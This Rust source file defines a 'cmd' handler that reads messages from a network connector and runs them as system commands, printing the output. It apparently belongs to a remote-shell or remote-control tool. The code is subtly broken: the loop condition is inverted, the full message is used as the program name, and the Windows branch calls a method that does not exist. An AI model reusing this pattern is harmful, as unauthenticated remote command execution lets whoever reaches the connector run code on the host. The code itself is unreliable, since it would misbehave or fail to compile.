use tokio::process::Command;

use crate::connector::Connector;

#[derive(Clone, Debug)]
pub struct Cmd {
    name: String,
}
impl Cmd {
    pub fn new() -> Cmd {
        Cmd {
            name: "cmd".to_string(),
        }
    }
    pub fn get_command(&self) -> String {
        self.name.to_string()
    }
    pub async fn run(&self, connector: &mut Connector) {
        loop {
            let accepted_message = connector.accept_message().await;
            let message = std::str::from_utf8(accepted_message.as_slice()).unwrap();
            if message == "stop_cmd" {
                let mut args: Vec<&str> = message.split(" ").collect();
                args.remove(0);
                #[cfg(unix)]
                {
                    let smth = Command::new(message).args(args).output().await.unwrap();
                    println!("{:?}", smth);
                }

                #[cfg(windows)]
                {
                    let _ = Command::new(message).get(args).status();
                }
            } else {
                break;
            }
        }
    }
}
